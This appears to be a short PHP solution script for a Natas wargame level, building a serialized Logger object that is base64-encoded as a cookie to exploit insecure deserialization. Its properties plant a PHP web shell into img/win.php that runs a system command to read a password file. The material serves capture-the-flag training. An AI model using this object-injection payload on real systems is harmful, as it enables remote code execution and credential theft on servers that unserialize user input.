//class Logger in the source code 
<?php
class Logger {
    private $logFile;
    private $initMsg;
    private $exitMsg;

    function __construct() {
        // initialise variables
        $this->initMsg = "<?php system('cat /etc/natas_webpass/natas27'); ?>";
        $this->exitMsg = "<?php system('cat /etc/natas_webpass/natas27'); ?>";
        $this->logFile = "img/win.php";
    }   
}

$object = new Logger();
print(base64_encode(serialize($object)));
// ^ now this is the b64 encoded drawing cookie that we want
?>

